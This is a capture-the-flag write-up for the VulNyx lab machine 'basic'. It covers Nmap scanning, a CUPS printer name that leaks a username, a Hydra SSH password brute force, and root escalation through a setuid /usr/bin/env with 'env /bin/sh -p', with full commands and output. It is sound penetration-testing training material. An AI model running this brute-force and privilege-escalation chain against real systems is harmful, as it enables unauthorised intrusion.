# basic

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| basic | m0w | Low | VulNyx |

**Summary:** The basic machine exposed three services to the network: OpenSSH on port 22, an Apache web server on port 80, and a Common Unix Printing System (CUPS) Internet Printing Protocol (IPP) daemon on port 631. Querying the CUPS service using the `lpstat` utility uncovered a configured printer destination named `dimitri_printer`, leaking the existence of the local user account `dimitri`. An SSH password brute force attack conducted with Hydra and the `rockyou.txt` wordlist cracked the credentials `dimitri:mememe`, granting low privilege SSH access to the machine. Post exploitation enumeration of setuid binaries revealed an anomalous SUID permission set on `/usr/bin/env`. Executing a privileged shell via `/usr/bin/env /bin/sh -p` preserved the effective root UID, yielding an interactive root session and enabling the retrieval of both the user and root flags.

---

## Reconnaissance

The assessment began with host discovery to pinpoint the IP address of the target machine within the isolated lab subnet.

1. An Nmap ping sweep identified the target at `192.168.56.121`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 06:04 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.0026s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0029s latency).
MAC Address: 08:00:27:43:2D:48 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.121 (192.168.56.121)
Host is up (0.0012s latency).
MAC Address: 08:00:27:60:A7:96 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 5.89 seconds
                                                                                                                     
┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.121
```

2. A full TCP port scan was performed to detect all active listening services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=5000 -Pn $ip  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 06:04 -0400
Nmap scan report for 192.168.56.121 (192.168.56.121)
Host is up (0.00046s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
631/tcp open  ipp
MAC Address: 08:00:27:60:A7:96 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.17 seconds
```

3. Service fingerprinting and standard NSE script scanning were launched against the discovered open ports:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 22,80,631 -sC -sV -T4 -Pn $ip 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 06:06 -0400
Nmap scan report for 192.168.56.121 (192.168.56.121)
Host is up (0.00042s latency).

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Test Debian Default Page: It works
631/tcp open  ipp     CUPS 2.3
|_http-title: Inicio - CUPS 2.3.3op2
|_http-server-header: CUPS/2.3 IPP/2.1
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 08:00:27:60:A7:96 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.51 seconds
```

4. An additional UDP scan on port 631 confirmed the presence of the CUPS printing service:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sU -p 631 $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 06:09 -0400
Nmap scan report for 192.168.56.121 (192.168.56.121)
Host is up (0.00035s latency).

PORT    STATE         SERVICE
631/udp open|filtered ipp
MAC Address: 08:00:27:60:A7:96 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.62 seconds
```

---

## Initial Access

### CUPS Enumeration and Username Disclosure

5. The CUPS IPP service running on port 631 was queried using `lpstat` to enumerate registered print queues and printer status:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ lpstat -h $ip:631 -a
dimitri_printer accepting requests since Thu 26 Oct 2023 06:15:43 AM EDT
                                                                                                                     
┌──(kali㉿kali)-[~/nyx]
└─$ lpstat -h $ip:631 -t
scheduler is running
no system default destination
device for dimitri_printer: socket://127.0.0.1:631
dimitri_printer accepting requests since Thu 26 Oct 2023 06:15:43 AM EDT
printer dimitri_printer is idle.  enabled since Thu 26 Oct 2023 06:15:43 AM EDT
```

The output revealed a configured printer destination named `dimitri_printer`, identifying `dimitri` as a valid local username.

### SSH Password Brute Force

6. With `dimitri` identified, Hydra was directed against the OpenSSH service using the standard `rockyou.txt` wordlist:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://$ip -t 32 -I -f
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-14 06:13:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 32 tasks per 1 server, overall 32 tasks, 14344399 login tries (l:1/p:14344399), ~448263 tries per task
[DATA] attacking ssh://192.168.56.121:22/
[STATUS] 332.00 tries/min, 332 tries in 00:01h, 14344078 to do in 720:06h, 21 active
[22][ssh] host: 192.168.56.121   login: dimitri   password: mememe
[STATUS] attack finished for 192.168.56.121 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-14 06:16:30
```

Hydra cracked the password `mememe` for user `dimitri`.

7. An SSH session was established with the recovered credentials, gaining low privilege shell access to the host:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ ssh dimitri@$ip
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
dimitri@192.168.56.121's password: 
dimitri@basic:~$ id;whoami;hostname
uid=1000(dimitri) gid=1000(dimitri) grupos=1000(dimitri)
dimitri
basic
```

---

## Privilege Escalation

### SUID Binary Abuse via env

8. System enumeration was performed to search for binaries configured with the setuid bit:

```bash
dimitri@basic:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 48480 sep 24  2020 /usr/bin/env
-rwsr-xr-x 1 root root 55528 ene 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 71912 ene 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 58416 feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 88304 feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 52880 feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 35040 ene 20  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 63960 feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 44632 feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 481608 sep 24  2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51336 jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 19040 ene 13  2022 /usr/libexec/polkit-agent-helper-1
```

The binary `/usr/bin/env` possessed the SUID permission bit owned by root.

9. Executing `/bin/sh` through `/usr/bin/env` with the `-p` flag preserved the effective root UID, and a one line Python command set both the real and effective UID and GID to 0:

```bash
dimitri@basic:~$ env /bin/sh -p
# python3 -c 'import os;os.setuid(0);os.setgid(0);os.system("/bin/sh")'
# su -
root@basic:~# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
basic
```

10. With complete root privileges acquired, both the user and root flags were read from the system:

```bash
# cat /home/dimitri/user.txt /root/root.txt
```

---

## Attack Chain Summary

1. **Reconnaissance**: Host discovery isolated `192.168.56.121` on the network, and an Nmap scan enumerated OpenSSH on port 22, Apache on port 80, and a CUPS IPP printing service on port 631.

2. **Vulnerability Discovery**: Interacting with the CUPS IPP daemon using `lpstat` exposed the printer queue `dimitri_printer`, leaking the local user name `dimitri`.

3. **Exploitation**: An SSH password brute force attack via Hydra against `dimitri` recovered the credentials `dimitri:mememe`, granting access as a standard user.

4. **Internal Enumeration**: A file permission search identified `/usr/bin/env` configured with setuid permissions owned by root.

5. **Privilege Escalation**: Executing `env /bin/sh -p` leveraged the setuid binary to spawn a root shell, culminating in full root access.
